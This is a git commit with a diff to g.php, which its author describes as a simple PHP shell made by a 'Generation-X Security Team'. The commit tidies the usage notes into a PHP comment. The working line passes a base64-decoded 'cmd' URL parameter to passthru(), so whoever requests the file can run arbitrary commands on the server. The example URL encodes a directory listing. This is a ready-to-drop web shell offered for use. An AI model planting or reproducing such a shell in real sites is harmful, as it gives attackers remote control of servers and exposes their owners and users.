f830670e0ca356597b6d514cb19b1b1594b4f303
xwh1t3r0s3 <xwh1t3r0s3@users.noreply.github.com>
2016-10-24 01:45:40 +0900

    g.php got improved

--- g.php
+++ g.php
@@ -1,16 +1,17 @@
-	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,<br>
-<br>
-	to use it just add ?cmd=[command that it is in base64 encryption] at the end of the link.<br>
+<?php
 
-	Example:<br>
-	https://example.com/g.php?cmd=bHMK<br>
+/*	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,
+ *
+	to use it just add ?cmd=[command that it is in base64 encryption] at the end of the link.
+
+	Example:
+	https://example.com/g.php?cmd=bHMK
 
 	Note:
 	The Command is strictly should be in base64 encryption to work :)
 
-	&copy; Wh1t3R0s3<br><br>
+	(c) Wh1t3R0s3
 -------------------------------------------------------------------------------------------------------------------------------
-<br>
-<?php
+ */
 echo passthru(base64_decode($_GET['cmd'])); _halt_compiler();
 ?>
